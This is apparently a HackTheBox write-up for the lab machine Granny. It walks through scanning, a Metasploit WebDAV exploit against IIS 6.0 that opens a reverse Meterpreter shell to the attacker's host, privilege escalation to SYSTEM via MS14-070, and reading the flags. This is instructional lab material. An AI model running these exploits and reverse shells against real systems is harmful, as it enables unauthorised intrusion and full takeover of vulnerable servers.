---
title: HackTheBox Walkthrough - Granny
date: "2020-02-02"
---

## About Granny
![](https://i.imgur.com/y3tkZuW.png)


[Granny](https://www.hackthebox.eu/home/machines/profile/14)


## Nmap
Port scan revelals IIS 6 running on this machine.

```sh
# nmap -sV -sT -sC -o nmapinitial 10.10.10.15
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-25 10:55 EST
Nmap scan report for 10.10.10.15
Host is up (0.22s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unkown
|   Server Date: Sat, 25 Jan 2020 15:56:14 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.67 seconds

```

## IIS 6 exploitation
This machine is runnig IIS 6 and `searchsploit` shows there's an MSF exploit for it.

```sh
# searchsploit IIS 6.0
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                                    |  Path                                  
                                                                                                                                                                                                  | (/usr/share/exploitdb/)                
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                                  | exploits/windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                                           | exploits/windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                                             | exploits/windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                                      | exploits/windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                                            | exploits/windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                                          | exploits/windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                                       | exploits/windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                                       | exploits/windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                                                                                                     | exploits/windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                                   | exploits/windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                                          | exploits/windows/remote/19033.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result 
```

Getting a shell with Metasploit.

```sh
# msfconsole -q
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl 
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhost 10.10.10.15
rhost => 10.10.10.15
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.46:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (180291 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.46:4444 -> 10.10.10.15:1030) at 2020-02-01 09:10:35 -0500

meterpreter >
```

First, start a background process and migrate it to Meterpreter.
Using the migrate post module, you can migrate to another process on the victim.

```sh
meterpreter > run post/windows/manage/migrate

[*] Running module against GRANNY
[*] Current server process: rundll32.exe (2460)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 3932
[+] Successfully migrated to process 3932
meterpreter > 
```

## Privilege escalation
I used `local_exploit_suggester` for finding privilege escalation vulnerabilities.

```sh
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 29 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf5 post(multi/recon/local_exploit_suggester) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >

```

Several vulnerabilities were found.
This time, escalate privileges using `ms14_070_tcpip_ioctl`.

```sh
meterpreter > background
[*] Backgrounding session 1...
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl 
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > run

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

I have SYSTEM access.
And I can now read the flag:

```sh
meterpreter > cd ../../../../../
meterpreter > pwd
c:\
meterpreter > ls
Listing: c:\
============

Mode                Size               Type  Last modified                    Name
----                ----               ----  -------------                    ----
40777/rwxrwxrwx     0                  dir   2017-04-12 10:27:12 -0400        ADFS
100777/rwxrwxrwx    0                  fil   2017-04-12 10:04:44 -0400        AUTOEXEC.BAT
100666/rw-rw-rw-    0                  fil   2017-04-12 10:04:44 -0400        CONFIG.SYS
40777/rwxrwxrwx     0                  dir   2017-04-12 09:42:38 -0400        Documents and Settings
40777/rwxrwxrwx     0                  dir   2017-04-12 10:17:24 -0400        FPSE_search
100444/r--r--r--    0                  fil   2017-04-12 10:04:44 -0400        IO.SYS
40777/rwxrwxrwx     0                  dir   2017-04-12 10:16:33 -0400        Inetpub
100444/r--r--r--    0                  fil   2017-04-12 10:04:44 -0400        MSDOS.SYS
100555/r-xr-xr-x    47772              fil   2007-02-18 07:00:00 -0500        NTDETECT.COM
40555/r-xr-xr-x     0                  dir   2017-04-12 09:43:02 -0400        Program Files
40777/rwxrwxrwx     0                  dir   2017-04-12 15:02:02 -0400        RECYCLER
40777/rwxrwxrwx     0                  dir   2017-04-12 09:42:38 -0400        System Volume Information
40777/rwxrwxrwx     0                  dir   2017-04-12 09:41:07 -0400        WINDOWS
100666/rw-rw-rw-    208                fil   2017-04-12 09:42:08 -0400        boot.ini
100444/r--r--r--    297072             fil   2007-02-18 07:00:00 -0500        ntldr
55611620/rw--w----  45595321274761199  fif   1453862520-01-07 02:04:32 -0500  pagefile.sys
40777/rwxrwxrwx     0                  dir   2017-04-12 10:05:06 -0400        wmpub

meterpreter > cd Documents\ and\ Settings 
meterpreter > ls
Listing: c:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-04-12 10:12:15 -0400  Administrator
40777/rwxrwxrwx  0     dir   2017-04-12 09:42:38 -0400  All Users
40777/rwxrwxrwx  0     dir   2017-04-12 09:42:38 -0400  Default User
40777/rwxrwxrwx  0     dir   2017-04-12 15:19:46 -0400  Lakis
40777/rwxrwxrwx  0     dir   2017-04-12 10:08:32 -0400  LocalService
40777/rwxrwxrwx  0     dir   2017-04-12 10:08:31 -0400  NetworkService

meterpreter >
```

User flag:

```sh
meterpreter > cd Lakis
meterpreter > ls
Listing: c:\Documents and Settings\Lakis
========================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2017-04-12 15:19:46 -0400  Application Data
40777/rwxrwxrwx   0       dir   2017-04-12 15:19:46 -0400  Cookies
40777/rwxrwxrwx   0       dir   2017-04-12 15:19:46 -0400  Desktop
40555/r-xr-xr-x   0       dir   2017-04-12 15:19:46 -0400  Favorites
40777/rwxrwxrwx   0       dir   2017-04-12 15:19:46 -0400  Local Settings
40555/r-xr-xr-x   0       dir   2017-04-12 15:19:46 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2017-04-12 15:19:46 -0400  NTUSER.DAT
40777/rwxrwxrwx   0       dir   2017-04-12 15:19:46 -0400  NetHood
40777/rwxrwxrwx   0       dir   2017-04-12 15:19:46 -0400  PrintHood
40555/r-xr-xr-x   0       dir   2017-04-12 15:19:46 -0400  Recent
40555/r-xr-xr-x   0       dir   2017-04-12 15:19:46 -0400  SendTo
40555/r-xr-xr-x   0       dir   2017-04-12 15:19:46 -0400  Start Menu
100666/rw-rw-rw-  0       fil   2017-04-12 15:19:46 -0400  Sti_Trace.log
40777/rwxrwxrwx   0       dir   2017-04-12 15:19:46 -0400  Templates
100666/rw-rw-rw-  1024    fil   2017-04-12 15:19:46 -0400  ntuser.dat.LOG
100666/rw-rw-rw-  178     fil   2017-04-12 15:19:46 -0400  ntuser.ini

meterpreter > cd Desktop 
meterpreter > ls
Listing: c:\Documents and Settings\Lakis\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 15:19:57 -0400  user.txt

meterpreter > cat user.txt
```

Root flag:

```sh
meterpreter > cd ../../
meterpreter > cd Administrator 
meterpreter > ls
Listing: c:\Documents and Settings\Administrator
================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2017-04-12 10:12:15 -0400  Application Data
40777/rwxrwxrwx   0       dir   2017-04-12 10:12:15 -0400  Cookies
40777/rwxrwxrwx   0       dir   2017-04-12 10:12:15 -0400  Desktop
40555/r-xr-xr-x   0       dir   2017-04-12 10:12:15 -0400  Favorites
40777/rwxrwxrwx   0       dir   2017-04-12 10:12:15 -0400  Local Settings
40555/r-xr-xr-x   0       dir   2017-04-12 10:12:15 -0400  My Documents
100666/rw-rw-rw-  786432  fil   2017-04-12 10:12:15 -0400  NTUSER.DAT
40777/rwxrwxrwx   0       dir   2017-04-12 10:12:15 -0400  NetHood
40777/rwxrwxrwx   0       dir   2017-04-12 10:12:15 -0400  PrintHood
40555/r-xr-xr-x   0       dir   2017-04-12 10:12:15 -0400  Recent
40555/r-xr-xr-x   0       dir   2017-04-12 10:12:15 -0400  SendTo
40555/r-xr-xr-x   0       dir   2017-04-12 10:12:15 -0400  Start Menu
100666/rw-rw-rw-  0       fil   2017-04-12 10:12:15 -0400  Sti_Trace.log
40777/rwxrwxrwx   0       dir   2017-04-12 10:12:15 -0400  Templates
40777/rwxrwxrwx   0       dir   2017-04-12 14:48:10 -0400  UserData
100666/rw-rw-rw-  1024    fil   2017-04-12 10:12:15 -0400  ntuser.dat.LOG
100666/rw-rw-rw-  178     fil   2017-04-12 10:12:15 -0400  ntuser.ini

meterpreter > cd Desktop 
meterpreter > ls
Listing: c:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 10:28:50 -0400  root.txt

meterpreter > cat root.txt 
```